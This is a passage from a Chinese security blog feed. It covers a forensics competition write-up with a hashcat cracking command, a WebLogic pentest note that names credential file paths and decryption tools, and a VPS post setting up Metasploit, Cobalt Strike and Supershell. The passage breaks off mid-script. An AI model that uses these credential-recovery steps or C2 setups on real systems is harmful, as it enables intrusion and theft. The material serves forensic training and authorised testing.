class="headerlink" title="id:10 名称:分发网站sb.wiiudot.cn本地数据库用户sb_wiiudot_cn的密码是_______。(格式:xxx)"></a>id:10 名称:分发网站sb.wiiudot.cn本地数据库用户sb_wiiudot_cn的密码是_______。(格式:xxx)</h5><p>KE5f3xnFHYAnG5Dt</p><p>错误答案：lSfXN770ZPjte9m</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928192309080.png" alt="image-20240928192309080"></p><p>忘记了我这里重构网站的时候这个密码是错的，被我改了，应该找备份文件的密码</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929012756831.png" alt="image-20240929012756831"></p><h4 id="服务器取证2"><a href="#服务器取证2" class="headerlink" title="服务器取证2"></a>服务器取证2</h4><h5 id="网站重构"><a href="#网站重构" class="headerlink" title="网站重构"></a>网站重构</h5><p>修改网站目录为根目录</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928220334028.png" alt="image-20240928220334028"></p><p>修改PHP版本为5.6或其他</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928220407662.png" alt="image-20240928220407662"></p><h5 id="id-1名称-请分析宝塔面板中默认建站目录是-。（标准格式：-etc-www）"><a href="#id-1名称-请分析宝塔面板中默认建站目录是-。（标准格式：-etc-www）" class="headerlink" title="id:1名称:请分析宝塔面板中默认建站目录是_______。（标准格式：&#x2F;etc&#x2F;www）"></a>id:1名称:请分析宝塔面板中默认建站目录是_______。（标准格式：&#x2F;etc&#x2F;www）</h5><p>&#x2F;home&#x2F;wwwroot</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928211300522.png" alt="image-20240928211300522"></p><h5 id="id-2-名称-在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是-。（标准格式：int-11-）"><a href="#id-2-名称-在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是-。（标准格式：int-11-）" class="headerlink" title="id:2 名称:在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是_______。（标准格式：int(11)）"></a>id:2 名称:在宝塔数据库目录有一个只含有一个表结构的数据库，请找到该“表结构文件”并分析出第六个字段的字段类型是_______。（标准格式：int(11)）</h5><p>CHAR(128)</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240929012949329.png" alt="image-20240929012949329"></p><h5 id="id-3-名称-请分析“乐享金融”网站绑定的域名是-。（标准格式：www-baidu-com）"><a href="#id-3-名称-请分析“乐享金融”网站绑定的域名是-。（标准格式：www-baidu-com）" class="headerlink" title="id:3 名称:请分析“乐享金融”网站绑定的域名是_______。（标准格式：www.baidu.com）"></a>id:3 名称:请分析“乐享金融”网站绑定的域名是_______。（标准格式：<a href="http://www.baidu.com)/">www.baidu.com）</a></h5><p>jinrong.goyasha.com</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928222034507.png" alt="image-20240928222034507"></p><h5 id="id-4-名称-请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是-。（标准格式：abcdefghijklmnopqrstuvwsyz）"><a href="#id-4-名称-请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是-。（标准格式：abcdefghijklmnopqrstuvwsyz）" class="headerlink" title="id:4 名称:请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是_______。（标准格式：abcdefghijklmnopqrstuvwsyz）"></a>id:4 名称:请访问“乐享金融”数据库并找到用户表，假设密码为123456，还原uid为2909，用户名为goyasha加密后密码的值是_______。（标准格式：abcdefghijklmnopqrstuvwsyz）</h5><p>d2174d958131ebd43bf900e616a752e1</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928223418164.png" alt="image-20240928223418164"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928223328184.png" alt="image-20240928223328184"></p><h5 id="id-5-名称-请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是-。（标准格式：爱金融）"><a href="#id-5-名称-请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是-。（标准格式：爱金融）" class="headerlink" title="id:5 名称:请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是_______。（标准格式：爱金融）"></a>id:5 名称:请重建“乐享金融”，访问平台前台登陆界面，会员登陆界面顶部LOGO上的几个字是_______。（标准格式：爱金融）</h5><p>睿文化</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928223557584.png" alt="image-20240928223557584"></p><h5 id="id-6-名称-请分析“乐享金融”一共添加了-个非外汇产品。（标准格式：5）"><a href="#id-6-名称-请分析“乐享金融”一共添加了-个非外汇产品。（标准格式：5）" class="headerlink" title="id:6 名称:请分析“乐享金融”一共添加了_______个非外汇产品。（标准格式：5）"></a>id:6 名称:请分析“乐享金融”一共添加了_______个非外汇产品。（标准格式：5）</h5><p>2</p><p>错误答案：4</p><p>cid为5的是外汇产品，还有4个产品是删除了的，如果算上删除的是4个</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928225047121.png" alt="image-20240928225047121"></p><h5 id="id-7-名称-请分析“乐享金融”设置充值泰达币的地址是-。（标准格式：EDFGF97B46234FDADSDF0270CB3E）"><a href="#id-7-名称-请分析“乐享金融”设置充值泰达币的地址是-。（标准格式：EDFGF97B46234FDADSDF0270CB3E）" class="headerlink" title="id:7 名称:请分析“乐享金融”设置充值泰达币的地址是_______。（标准格式：EDFGF97B46234FDADSDF0270CB3E）"></a>id:7 名称:请分析“乐享金融”设置充值泰达币的地址是_______。（标准格式：EDFGF97B46234FDADSDF0270CB3E）</h5><p>85CF33F97B46A88C7386286D0270CB3E</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928225141659.png" alt="image-20240928225141659"></p><h5 id="id-8-名称-请分析“乐享金融”充值金额大于582402元的受害人充值总金额是-。（标准格式：12345678）"><a href="#id-8-名称-请分析“乐享金融”充值金额大于582402元的受害人充值总金额是-。（标准格式：12345678）" class="headerlink" title="id:8 名称:请分析“乐享金融”充值金额大于582402元的受害人充值总金额是_______。（标准格式：12345678）"></a>id:8 名称:请分析“乐享金融”充值金额大于582402元的受害人充值总金额是_______。（标准格式：12345678）</h5><p>答案不确定：6470314</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928225516144.png" alt="image-20240928225516144"></p><h5 id="id-9-名称-请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是-。（标准格式：张三）"><a href="#id-9-名称-请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是-。（标准格式：张三）" class="headerlink" title="id:9 名称:请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是_______。（标准格式：张三）"></a>id:9 名称:请分析“乐享金融”银行卡号“6239039472846284913”绑定用户的用户名是_______。（标准格式：张三）</h5><p>kongxin</p><p>错误答案：张教瘦</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928225547087.png" alt="image-20240928225547087"></p><p>对应的userid的username是kongxin</p><h5 id="id-10-名称-请分析“乐享金融”建仓时间为“2022-03-01-18-44-01”，平仓时间为“2022-03-01-18-52-01”，以太坊-泰达币的这一笔交易的平仓价格是-。（标准格式：1888-668）"><a href="#id-10-名称-请分析“乐享金融”建仓时间为“2022-03-01-18-44-01”，平仓时间为“2022-03-01-18-52-01”，以太坊-泰达币的这一笔交易的平仓价格是-。（标准格式：1888-668）" class="headerlink" title="id:10 名称:请分析“乐享金融”建仓时间为“2022&#x2F;03&#x2F;01 18:44:01”，平仓时间为“2022&#x2F;03&#x2F;01 18:52:01”，以太坊&#x2F;泰达币的这一笔交易的平仓价格是_______。（标准格式：1888.668）"></a>id:10 名称:请分析“乐享金融”建仓时间为“2022&#x2F;03&#x2F;01 18:44:01”，平仓时间为“2022&#x2F;03&#x2F;01 18:52:01”，以太坊&#x2F;泰达币的这一笔交易的平仓价格是_______。（标准格式：1888.668）</h5><p>2896.924</p><p>建仓时间1646131441平仓时间1646131921</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928230007791.png" alt="image-20240928230007791"></p><h5 id="id-11-名称-请分析“乐享金融”订单编号为“202112090946233262”平仓时间是-。（标准格式：2022-1-11-1-22-43）"><a href="#id-11-名称-请分析“乐享金融”订单编号为“202112090946233262”平仓时间是-。（标准格式：2022-1-11-1-22-43）" class="headerlink" title="id:11 名称:请分析“乐享金融”订单编号为“202112090946233262”平仓时间是_______。（标准格式：2022-1-11.1:22:43）"></a>id:11 名称:请分析“乐享金融”订单编号为“202112090946233262”平仓时间是_______。（标准格式：2022-1-11.1:22:43）</h5><p>1639014743</p><p>宝塔备份文件里有，直接查查不到</p><h5 id="id-12-名称-宝塔面板某用户曾尝试进行一次POST请求，参数为“-BTCloud-action-UploadFilesData”，请问该用户疑似使用的（-）电脑系统进行访问请求的。"><a href="#id-12-名称-宝塔面板某用户曾尝试进行一次POST请求，参数为“-BTCloud-action-UploadFilesData”，请问该用户疑似使用的（-）电脑系统进行访问请求的。" class="headerlink" title="id:12 名称:宝塔面板某用户曾尝试进行一次POST请求，参数为“&#x2F;BTCloud?action&#x3D;UploadFilesData”，请问该用户疑似使用的（  ）电脑系统进行访问请求的。"></a>id:12 名称:宝塔面板某用户曾尝试进行一次POST请求，参数为“&#x2F;BTCloud?action&#x3D;UploadFilesData”，请问该用户疑似使用的（  ）电脑系统进行访问请求的。</h5><p>A.Windows 8.1</p><p>B.Windows 10</p><p>C.Windows 11</p><p>D.Windows Server 2000</p><p>A</p><p>在&#x2F;www&#x2F;server&#x2F;panel&#x2F;logs&#x2F;request下有备份日志</p><h5 id="id-13-名称-请分析该服务器镜像最高权限“root”账户的密码是-。（标准格式：a123456）"><a href="#id-13-名称-请分析该服务器镜像最高权限“root”账户的密码是-。（标准格式：a123456）" class="headerlink" title="id:13 名称:请分析该服务器镜像最高权限“root”账户的密码是_______。（标准格式：a123456）"></a>id:13 名称:请分析该服务器镜像最高权限“root”账户的密码是_______。（标准格式：a123456）</h5><p>g123123</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat  -a 0 $1$kmYU/aog$fKIF3ugewwCTuPWOSksjD/ rockyou.txt --force --self-test-disable</span><br></pre></td></tr></table></figure><p>cmd5查是付费记录</p>]]></content>
      
      
      <categories>
          
          <category> 比赛复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 龙信杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker镜像源问题解决记录</title>
      <link href="/2024/09/19/docker%E9%95%9C%E5%83%8F%E6%BA%90%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/09/19/docker%E9%95%9C%E5%83%8F%E6%BA%90%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker镜像源问题解决记录"><a href="#Docker镜像源问题解决记录" class="headerlink" title="Docker镜像源问题解决记录"></a>Docker镜像源问题解决记录</h1><p>问题的根源是因为dockerhub被墙，同时国内的镜像加速源也都关闭或调整，所以我直接选择了采取代理的方式解决问题（代理的问题不方便做过多描述）</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240919212645641.png" alt="image-20240919212645641"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使配置生效</span><br><span class="line">systemctl daemon-reload</span><br><span class="line"># 重启Docker</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><p>后面的话就正常pull想要的镜像就好</p><p>代理日志显示正常</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240919212902965.png" alt="image-20240919212902965"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对WebLogic的渗透测试笔记</title>
      <link href="/2024/08/31/%E5%AF%B9WebLogic%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/08/31/%E5%AF%B9WebLogic%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="对WebLogic的渗透测试笔记"><a href="#对WebLogic的渗透测试笔记" class="headerlink" title="对WebLogic的渗透测试笔记"></a>对WebLogic的渗透测试笔记</h1><p>2024省护后的一些学习，碰到一个WebLogic，但后渗透信息搜集时很恼火，找不到密码，不知道从何下手</p><p>说明：渗透测试建立在合法授权基础，请勿非授权渗透测试，此文章所有截图内容均已脱敏，在合法授权测试期间所提交报告中所截</p><h2 id="重要目录结构"><a href="#重要目录结构" class="headerlink" title="重要目录结构"></a>重要目录结构</h2><h3 id="opt-Oracle-Middleware"><a href="#opt-Oracle-Middleware" class="headerlink" title="&#x2F;opt&#x2F;Oracle&#x2F;Middleware&#x2F;"></a>&#x2F;opt&#x2F;Oracle&#x2F;Middleware&#x2F;</h3><h4 id="user-projects"><a href="#user-projects" class="headerlink" title="user_projects"></a><strong>user_projects</strong></h4><ul><li><strong>描述</strong>: 这个目录包含用户创建的WebLogic Server域和应用程序项目。</li><li><strong>用途</strong>: 用户在此目录中创建和管理自己的域，配置服务器、部署应用程序等。</li></ul><h4 id="wlserver-10-3"><a href="#wlserver-10-3" class="headerlink" title="wlserver_10.3"></a><strong>wlserver_10.3</strong></h4><ul><li><strong>描述</strong>: 这是WebLogic Server 10.3版本的主安装目录，包含所有WebLogic Server的核心文件、库、配置文件等。</li><li><strong>用途</strong>: 是WebLogic Server运行所需的核心目录，包含启动和运行服务器的所有必要文件和组件。</li></ul><h3 id="opt-Oracle-Middleware-user-projects-domains-xxx-domain"><a href="#opt-Oracle-Middleware-user-projects-domains-xxx-domain" class="headerlink" title="&#x2F;opt&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;xxx_domain&#x2F;"></a>&#x2F;opt&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;xxx_domain&#x2F;</h3><h4 id="config"><a href="#config" class="headerlink" title="config"></a><strong>config</strong></h4><ul><li><p><strong>描述</strong>: 这是域的主要配置目录，包含WebLogic Server的所有配置文件。</p></li><li><p><strong>用途</strong>: 配置文件（如<code>config.xml</code>）定义了域的结构、服务器、集群、JDBC数据源、安全设置等。这个目录是WebLogic Server域配置的核心。</p></li><li><p><strong>jdbc</strong></p><ul><li><strong>描述</strong>: 这个目录包含域中所有JDBC数据源的配置文件。</li><li><strong>用途</strong>: 用于管理与数据库的连接。每个JDBC数据源的配置都可能会在这个目录中以XML文件的形式存储。</li></ul></li><li><h5 id="config-xml"><a href="#config-xml" class="headerlink" title="config.xml"></a><strong>config.xml</strong></h5><ul><li><strong>描述</strong>: 这是域的主配置文件，包含了WebLogic Server域的所有核心配置。</li><li><strong>用途</strong>: 定义域的结构、服务器、集群、JDBC数据源、JMS资源、安全设置等。它是WebLogic Server域配置的核心文件。</li></ul><p>网站源码路径</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240901010342422.png" alt="image-20240901010342422"></p></li></ul><h3 id="opt-Oracle-Middleware-user-projects-domains-wisedu-domain-servers-AdminServer"><a href="#opt-Oracle-Middleware-user-projects-domains-wisedu-domain-servers-AdminServer" class="headerlink" title="&#x2F;opt&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;wisedu_domain&#x2F;servers&#x2F;AdminServer&#x2F;"></a>&#x2F;opt&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;wisedu_domain&#x2F;servers&#x2F;AdminServer&#x2F;</h3><h4 id="tmp"><a href="#tmp" class="headerlink" title="tmp"></a><strong>tmp</strong></h4><ul><li><strong>用途</strong>: 存放服务器运行时的临时文件。</li><li><strong>常见文件</strong>: 包含临时的JSP编译文件、会话数据等，通常在服务器重启时清理。</li></ul><h3 id="opt-Oracle-Middleware-user-projects-domains-wisedu-domain-servers-AdminServer-1"><a href="#opt-Oracle-Middleware-user-projects-domains-wisedu-domain-servers-AdminServer-1" class="headerlink" title="&#x2F;opt&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;wisedu_domain&#x2F;servers&#x2F;AdminServer&#x2F;"></a>&#x2F;opt&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;wisedu_domain&#x2F;servers&#x2F;AdminServer&#x2F;</h3><h4 id="logs"><a href="#logs" class="headerlink" title="logs"></a><strong>logs</strong></h4><ul><li><strong>描述</strong>: 这个目录用于存放WebLogic Server运行时生成的日志文件。</li><li><strong>用途</strong>: 日志文件包含服务器运行状态、错误信息、警告和其他相关信息，方便排查问题和监控服务器状态。</li></ul><h2 id="weblogic-jdbc密码和console密码解密"><a href="#weblogic-jdbc密码和console密码解密" class="headerlink" title="weblogic jdbc密码和console密码解密"></a>weblogic jdbc密码和console密码解密</h2><p>weblogic10以前的加密方式基本都是DES，weblogic10以后的机密方式基本都是AES，这两个加密方式都是对称加密</p><p><strong>参考资料</strong></p><p><a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a></p><p><a href="https://github.com/Ch1ngg/WebLogicPasswordDecryptorUi">https://github.com/Ch1ngg/WebLogicPasswordDecryptorUi</a></p><p>准备文件如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat</span><br><span class="line"></span><br><span class="line">/opt/Oracle/Middleware/wlserver_xxx/server/lib/weblogic.jar</span><br><span class="line"></span><br><span class="line">WebLogicDecryptor.java #解密程序</span><br></pre></td></tr></table></figure><p>AES一般是这样的<code>&#123;AES&#125;ObwFrA5PSOW+/7+vgtZpxk/1Esw81ukoknfH4QUYjWY=</code></p><p>3DES一般是这样的<code>&#123;3DES&#125;JMRazF/vClP1WAgy1czd2Q==</code></p><p>console：</p><p>&#x2F;opt&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;security&#x2F;boot.properties</p><p>&#x2F;root&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;security&#x2F;boot.properties</p><p>jdbc：</p><p>&#x2F;opt&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;config&#x2F;jdbc&#x2F;</p><p>jdbc配置文件</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240831230542631.png" alt="image-20240831230542631"></p><p>密码</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240831230822001.png" alt="image-20240831230822001"></p><p>工具解密</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240831230505245.png" alt="image-20240831230505245"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebLogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VPS搭建渗透工具记录（待补充更新）</title>
      <link href="/2024/07/26/VPS%E6%90%AD%E5%BB%BA%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E8%AE%B0%E5%BD%95%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>/2024/07/26/VPS%E6%90%AD%E5%BB%BA%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E8%AE%B0%E5%BD%95%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="VPS搭建渗透工具记录（待补充更新）"><a href="#VPS搭建渗透工具记录（待补充更新）" class="headerlink" title="VPS搭建渗透工具记录（待补充更新）"></a>VPS搭建渗透工具记录（待补充更新）</h1><p>由于近期在云尘靶场和春秋云镜练习内网渗透靶场的需要，故在新买的vps上搭建了msf和cs，本机虚拟机的kali因为没有公网ip，所以在练习春秋云镜靶场时，无法建立reveser_tcp，只能使用bind_tcp….</p><h2 id="vps说明"><a href="#vps说明" class="headerlink" title="vps说明"></a>vps说明</h2><p>vps是今天新嫖的阿里云，昨天刷公众号刷到一个优惠卷的信息，今天刚好有需求就上去试了，还是真的，300元优惠卷，买了一个2h2g、一年、45G系统盘的ecs</p><p><a href="https://university.aliyun.com/mobile?clubTaskBiz=subTask..11487209..10214..&userCode=8tnqyfpb">优惠卷链接</a></p><p>激活一下学生认证就可以了 </p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240726172039555.png" alt="image-20240726172039555.png"></p><h2 id="msf搭建"><a href="#msf搭建" class="headerlink" title="msf搭建"></a>msf搭建</h2><p>一个命令其实就可以了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \</span><br><span class="line">  chmod 755 msfinstall &amp;&amp; \</span><br><span class="line">  ./msfinstall</span><br></pre></td></tr></table></figure><p>具体后面还有什么配置的话，等后面我再更新</p><h2 id="cs搭建"><a href="#cs搭建" class="headerlink" title="cs搭建"></a>cs搭建</h2><p>安装java8环境，我使用的是cs4.3</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade</span><br><span class="line">apt install openjdk-8-jre-headless</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240726172102664.png" alt="image-20240726172102664.png"></p><p>然后把cs4.3传上去，就可以使用了</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240726172214472.png" alt="image-20240726172214472"></p><h2 id="Supershell搭建"><a href="#Supershell搭建" class="headerlink" title="Supershell搭建"></a>Supershell搭建</h2><p>下载Supershell，配置请看<a href="https://github.com/tdragon6/Supershell">此链接</a>，在此不作介绍</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/tdragon6/Supershell/releases/download/v2.0.0/Supershell.tar.gz</span><br></pre></td></tr></table></figure><p>主要讲下docker的镜像加速源配置，因为之前一直用的是阿里云和道客云的镜像加速源，所以大部分时候都没有出问题，最近碰到两次都有镜像拉不下来，所以在这里讲下如何自建镜像加速源，<a href="https://xiaowangye.org/posts/how-to-build-docker-hub-mirror-with-cloudflare-workers/">参考链接</a></p><p><strong>准备</strong></p><p>需要一个cloudflare账号和一个域名</p><p><strong>开始</strong></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240726181202154.png" alt="image-20240726181202154"></p><p>js代码改为如下，记得修改里面的域名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">addEventListener(&quot;fetch&quot;, (event) =&gt; &#123;</span><br><span class="line">  event.passThroughOnException();</span><br><span class="line">  event.respondWith(handleRequest(event.request));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">const dockerHub = &quot;https://registry-1.docker.io&quot;;</span><br><span class="line">const HTML = `</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;shortcut icon&quot; href=&quot;https://xiaowangye.org/assets/img/favicons/favicon.ico&quot;&gt;</span><br><span class="line">    &lt;title&gt;Docker 镜像代理使用说明&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: &#x27;Roboto&#x27;, sans-serif;</span><br><span class="line">            margin: 0;</span><br><span class="line">            padding: 0;</span><br><span class="line">            background-color: #f4f4f4;</span><br><span class="line">        &#125;</span><br><span class="line">        .header &#123;</span><br><span class="line">            background: linear-gradient(135deg, #667eea, #764ba2);</span><br><span class="line">            color: #fff;</span><br><span class="line">            padding: 20px 0;</span><br><span class="line">            text-align: center;</span><br><span class="line">            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);</span><br><span class="line">        &#125;</span><br><span class="line">        .container &#123;</span><br><span class="line">            max-width: 800px;</span><br><span class="line">            margin: 40px auto;</span><br><span class="line">            padding: 20px;</span><br><span class="line">            background-color: #fff;</span><br><span class="line">            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);</span><br><span class="line">            border-radius: 10px;</span><br><span class="line">        &#125;</span><br><span class="line">        .content &#123;</span><br><span class="line">            margin-bottom: 20px;</span><br><span class="line">        &#125;</span><br><span class="line">        .footer &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            padding: 20px 0;</span><br><span class="line">            background-color: #333;</span><br><span class="line">            color: #fff;</span><br><span class="line">        &#125;</span><br><span class="line">        pre &#123;</span><br><span class="line">            background-color: #272822;</span><br><span class="line">            color: #f8f8f2;</span><br><span class="line">            padding: 15px;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            overflow-x: auto;</span><br><span class="line">        &#125;</span><br><span class="line">        code &#123;</span><br><span class="line">            font-family: &#x27;Source Code Pro&#x27;, monospace;</span><br><span class="line">        &#125;</span><br><span class="line">        a &#123;</span><br><span class="line">            font-weight: bold;</span><br><span class="line">            color: #ffffff;</span><br><span class="line">            text-decoration: none;</span><br><span class="line">        &#125;</span><br><span class="line">        a:hover &#123;</span><br><span class="line">            text-decoration: underline;</span><br><span class="line">        &#125;</span><br><span class="line">        @media (max-width: 600px) &#123;</span><br><span class="line">            .container &#123;</span><br><span class="line">                margin: 20px;</span><br><span class="line">                padding: 15px;</span><br><span class="line">            &#125;</span><br><span class="line">            .header &#123;</span><br><span class="line">                padding: 15px 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;link href=&quot;https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;family=Source+Code+Pro:wght@400;700&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">        &lt;h1&gt;Docker 镜像代理使用说明&lt;/h1&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">          &lt;h3&gt;带镜像仓库地址使用说明&lt;/h3&gt;</span><br><span class="line">          &lt;p&gt;1.拉取镜像&lt;/p&gt;</span><br><span class="line">          &lt;pre&gt;&lt;code&gt;# 拉取 redis 官方镜像（不带命名空间）</span><br><span class="line">docker pull &#123;:host&#125;/redis</span><br><span class="line"></span><br><span class="line"># 拉取 rabbitmq 官方镜像</span><br><span class="line">docker pull &#123;:host&#125;/library/rabbitmq</span><br><span class="line"></span><br><span class="line"># 拉取 postgresql 非官方镜像</span><br><span class="line">docker pull &#123;:host&#125;/bitnami/postgresql&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.重命名镜像&lt;/p&gt;</span><br><span class="line">          &lt;pre&gt;&lt;code&gt;# 重命名 redis 镜像</span><br><span class="line">docker tag &#123;:host&#125;/library/redis redis </span><br><span class="line"></span><br><span class="line"># 重命名 postgresql 镜像</span><br><span class="line">docker tag &#123;:host&#125;/bitnami/postgresql bitnami/postgresql&lt;/code&gt;&lt;/pre&gt;&lt;h3&gt;镜像源方式使用说明&lt;/h3&gt;&lt;p&gt;1.添加镜像源&lt;/p&gt;</span><br><span class="line">          &lt;pre&gt;&lt;code&gt;# 添加镜像代理到 Docker 镜像源</span><br><span class="line">sudo tee /etc/docker/daemon.json &amp;lt;&amp;lt; EOF</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://&#123;:host&#125;&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.拉取镜像&lt;/p&gt;</span><br><span class="line">&lt;pre&gt;&lt;code&gt;# 拉取 redis 官方镜像</span><br><span class="line">docker pull redis</span><br><span class="line"></span><br><span class="line"># 拉取 rabbitmq 非官方镜像</span><br><span class="line">docker pull bitnami/rabbitmq</span><br><span class="line"></span><br><span class="line"># 拉取 postgresql 官方镜像</span><br><span class="line">docker pull postgresql&lt;/code&gt;&lt;/pre&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">        &lt;p&gt;©2024 &lt;a href=&quot;https://xiaowangye.org&quot;&gt;xiaowangye.org&lt;/a&gt;. All rights reserved. Powered by &lt;a 